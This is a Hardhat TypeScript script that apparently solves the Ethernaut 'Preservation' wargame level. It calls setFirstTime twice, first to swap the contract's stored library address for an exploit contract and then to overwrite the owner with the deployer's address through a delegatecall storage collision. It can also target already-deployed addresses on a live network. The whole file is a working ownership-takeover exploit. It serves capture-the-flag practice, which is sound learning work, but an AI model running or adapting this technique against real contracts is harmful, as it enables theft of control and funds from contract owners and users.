import { ethers, network } from "hardhat"
import { developmentChains, networkConfig } from "../helper-hardhat-config"
import { ExploitLibraryContract, Preservation } from "../typechain-types"
import { PRESERVATION, PRESERVATIONEXPLOIT } from "../constants"
import { text } from "stream/consumers"
import { verify } from "crypto"
const preservationExploit = async () => {
    let preservationContract: Preservation
    let exploit: ExploitLibraryContract
    const accounts = await ethers.getSigners()
    const deployer = accounts[0]

    if (!developmentChains.includes(network.name)) {
        preservationContract = await ethers.getContractAt("Preservation", PRESERVATION)
        exploit = await ethers.getContractAt("ExploitLibraryContract", PRESERVATIONEXPLOIT)
    } else {
        preservationContract = await ethers.getContract("Preservation", deployer)
        exploit = await ethers.getContract("ExploitLibraryContract", deployer)
    }

    console.log("preservation contract owner before exploit", await preservationContract.owner())
    //-n get address of exploit contract in uint256
    const exploitAddressNumber = await exploit.convertAddressToUint(exploit.address)

    //-n first step is to change the timeZone1Library address in the preservationContract
    //-n this address will be changed to the exploit contract address
    await (await preservationContract.setFirstTime(exploitAddressNumber)).wait()

    //-n now that library contract address inside preservation is changed
    //-n next step is to again call setFirsttime -> this time, it changes the owner
    const deployerAddressNumber = await exploit.convertAddressToUint(deployer.address)

    await (await preservationContract.setFirstTime(deployerAddressNumber)).wait()

    console.log("preservation contract owner after exploit", await preservationContract.owner())
    console.log("note that it matches deployer address", deployer.address)
}

preservationExploit()
    .then(() => {
        console.log("Preservation Exploit successful")
        process.exit(0)
    })
    .catch((e) => {
        console.error(e)
        process.exit(1)
    })
